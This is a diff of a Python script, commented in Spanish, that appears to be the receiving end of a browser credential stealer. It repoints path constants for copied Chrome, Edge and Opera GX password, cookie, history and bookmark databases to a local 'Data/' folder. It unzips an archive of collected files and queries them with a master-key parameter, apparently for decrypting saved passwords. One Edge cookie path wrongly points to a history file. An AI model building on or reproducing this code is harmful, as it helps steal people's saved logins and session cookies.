@@ -5,39 +5,23 @@ import shutil
 
 # Enviar de client a server , haciendo que en el serve se guarden en x sitio.
 
-BasePath = os.getenv('localappdata')
+BasePath = "Data/"
 
 COPY_PATH = {
-    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
-                                    '\\Temp\\Copy\\Chrome_Local_State',
-    "CHROME_PASSWORDS_DB_PATH": BasePath + \
-                                '\\Temp\\Copy\\Chrome_Login_Data',
-    "CHROME_COOKIES_DB_PATH": BasePath + \
-                              '\\Temp\\Copy\\Chrome_Cookies',
-    "CHROME_HISTORY_DB_PATH": BasePath + \
-                              '\\Temp\\Copy\\Chrome_History',
-    "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
-                                  '\\Temp\\Copy\\Chrome_Bookmarks',
-    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
-                                  '\\Temp\\Copy\\Edge_Local_State',
-    "EDGE_PASSWORDS_DB_PATH": BasePath + \
-                              '\\Temp\\Copy\\Default\\Edge_Login_Data',
-    "EDGE_COOKIES_DB_PATH": BasePath + \
-                            '\\Temp\\Copy\\Default\\Edge_Cookies',
-    "EDGE_HISTORY_DB_PATH": BasePath + \
-                            '\\Temp\\Copy\\Default\\Edge_History',
-    "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
-                                '\\Temp\\Copy\\Default\\Edge_Bookmarks',
-    "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
-                                     '\\Temp\\Copy\\OPERAGX_Local_State',
-    "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
-                                 '\\Temp\\Copy\\OPERAGX_Login_Data',
-    "OPERAGX_COOKIES_DB_PATH": BasePath + \
-                               '\\Temp\\Copy\\OPERAGX_Cookies',
-    "OPERAGX_HISTORY_DB_PATH": BasePath + \
-                               '\\Temp\\Copy\\OPERAGX_History',
-    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
-                                   '\\Temp\\Copy\\OPERAGX_Bookmarks',
+    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + "Chrome_Local_State",
+    "CHROME_PASSWORDS_DB_PATH": BasePath + "Chrome_Login_Data",
+    "CHROME_COOKIES_DB_PATH": BasePath + "Chrome_Cookies",
+    "CHROME_HISTORY_DB_PATH": BasePath + "Chrome_History",
+    "CHROME_BOOKMARKS_FILE_PATH": BasePath + "Chrome_Bookmarks",
+    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + "Edge_Local_State",
+    "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
+    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
+    "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
+    "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
+    "OPERAGX_PASSWORDS_DB_PATH": BasePath + "OPERAGX_Login_Data",
+    "OPERAGX_COOKIES_DB_PATH": BasePath + "OPERAGX_Cookies",
+    "OPERAGX_HISTORY_DB_PATH": BasePath + "OPERAGX_History",
+    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + "OPERAGX_Bookmarks",
 }
 
 SQL = {
@@ -57,8 +41,7 @@ def get_db_data(file,command,master_key=None):
 
 def main():
 
-    #shutil.unpack_archive("Data123963.zip", "Data/")
-
+    shutil.unpack_archive("Data123963.zip", "Data/")
 
 
 
@@ -67,12 +50,10 @@ def main():
      for file_path in TARGET_FILE_PATH:
     """
 
-    """
+
     x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
     for i in x:
         print(i)
-    """
-
 
 
 
